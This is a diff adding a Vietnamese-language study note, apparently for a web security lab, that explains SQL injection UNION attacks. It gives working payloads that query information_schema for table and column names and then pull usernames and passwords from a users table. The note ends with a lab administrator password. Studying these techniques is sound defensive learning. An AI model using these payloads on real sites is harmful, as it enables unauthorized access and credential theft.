@@ -424,11 +424,97 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
 
   Do cột *b* có dữ liệu string nên hợp lệ với kết quả hợp '8Dx9Oj'.
   
+---
 
+## 8. Sử dụng SQLi UNION attacks để thu thập thông tin.
 
+- Như đã trình bày trong các mục trước, ta có thể sử dụng câu lệnh UNION SELECT để kết hợp với câu truy vấn gốc để lấy những dữ liệu hữu ích.
+
+- Ví dụ, ta có thể tạo payload *' UNION SELECT username, password FROM users--* để thu thập thông tin đăng nhập người đùng, câu truy vấn lúc này có thể:
+
+  ```sql
+  SELECT col1, col2 FROM products WHERE name = '' UNION SELECT username, password FROM users--'
+  ```
+
+- Một vấn đề khác đặt ra là làm thế nào để lấy được thông tin các tên bảng cũng như tên cột. Do đó mà khi ta không biết cấu trúc dữ liệu của hệ thống, ta có thể dò bằng cách sử dụng truy vấn bảng hệ thống như: *information_schema.tables, information_schema.columns*
+
+- Ví dụ:
+
+  ```sql
+  ' UNION SELECT table_name, NULL FROM information_schema.tables--
+  ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
+  ```
+
+### Lab: SQL injection UNION attack, retrieving data from other tables
+
+- Giao diện trang web ta thực hiện khai thác:
+
+  <img width="1919" height="878" alt="image" src="https://github.com/user-attachments/assets/893c8600-a612-4403-a683-920d9e651a0b" />
+
+  Gửi request category Pets vào trong Repeater:
+
+  <img width="1429" height="807" alt="image" src="https://github.com/user-attachments/assets/7ad1688b-aad5-47f5-8720-d011c3e81c93" />
+
+  Xác định được câu truy vấn gốc category có hai côt:
+
+  <img width="1428" height="788" alt="image" src="https://github.com/user-attachments/assets/3abe3e45-d66d-46c3-a9ed-d51299bd2356" />
+
+  Tạo payload lấy thông tin các bảng có tròng CSDL hệ thống:
+
+  ```bash
+  GET /filter?category=Pets' UNION SELECT table_name, NULL FROM information_schema.tables --
+  ```
+
+  Câu truy vấn lúc này là:
+
+  ```sql
+  SELECT a, b FROM products WHERE category='Pets' UNION SELECT table_name, NULL FROM information_schema.tables --'
+  ```
+
+  <img width="1873" height="748" alt="image" src="https://github.com/user-attachments/assets/c5b3ddea-157b-4529-88f9-7800e4b4e00a" />
+
+  &rarr; Từ đây ta xác định được CSDL có bảng users.
+
+  Tạo payload lấy thông tin các tên cột có tròng bảng users đã xác định trước đó:
+
+  ```bash
+  GET /filter?category=Pets' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
+  ```
+  
+  <img width="1874" height="739" alt="image" src="https://github.com/user-attachments/assets/f1c9ea74-d179-4fe7-96e8-6d07063e7025" />
+
+  &rarr; Phát hiện có hai cột là username và password.
+
+  Thực hiện tạo payload như sau để lấy thông tin đăng nhập:
+
+  ```bash
+  GET /filter?category=Pets' UNION SELECT username, password from users --
+  ```
+
+  Câu truy vấn lúc này sẽ là:
+
+  ```sql
+  SELECT a, b FROM products WHERE category='Pets' UNION SELECT username, password from users --'
+  ```
+
+  <img width="1867" height="752" alt="image" src="https://github.com/user-attachments/assets/6781822d-34b8-4a08-9180-1ca2f3ab1cf1" />
+
+  &rarr; Kết quả trả về của câu truy vấn UNION SELECT. Lấy thành công thông tin đăng nhập.
+
+  Đăng nhập thành công tài khoản administrator với password là 8x3negbkpcm0smzysrh7:
+
+  <img width="1919" height="876" alt="image" src="https://github.com/user-attachments/assets/fd7ef353-a907-4b52-9f13-afcc63357a19" />
 
 
   
+
+  
+  
+
+
+  
+
+
   
   
 
